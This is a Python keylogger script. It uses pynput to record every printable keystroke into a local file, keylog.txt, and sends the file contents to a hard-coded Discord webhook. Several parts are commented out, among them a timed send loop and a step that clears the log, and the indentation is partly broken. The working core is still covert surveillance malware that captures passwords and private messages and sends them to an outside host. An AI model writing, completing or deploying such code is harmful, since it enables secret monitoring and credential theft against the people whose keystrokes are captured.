from pynput import keyboard
from dhooks import Webhook
#import requests
#import json
import time

hook = Webhook ("https://discord.com/api/webhooks/1403879249550643331/PkMQvk-fo0oxhsXNMTwoTkFMy_gGN6KIfk8NRFnvxgppHDeQTEfAspy-LHw2-K3dKiPb")
#rdm_sec = [500,600,700,800,900]

# This function runs every time a key is pressed
def on_press(key):
    try:
        # Try to get the printable character
        log = key.char
#        hook.send(log) #slow
#error handler
    except AttributeError:
        return


    # Save to file
    with open("keylog.txt", "a") as file:
        file.write(log)


# Start the key listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()



#send content of file function
#def send_file():
    with open("keylog.txt", "r") as file:
        content = file.read()




#    json = {"content": content}
        # send only if file has contents
#    if not content.strip():
#     return


    hook.send(content)
#    response = requests.post(webhook, json=json)
#    print(response.json())


    # delete contents of file
#    if response.status_code == 204:
#        with open("keylog.txt", "r+") as con:
#            con.seek(0)
#            con.truncate()




#--execute send_file function here
#while True:
#    send_file()
#    time.sleep(100)  # 300 sec. 5 minutes



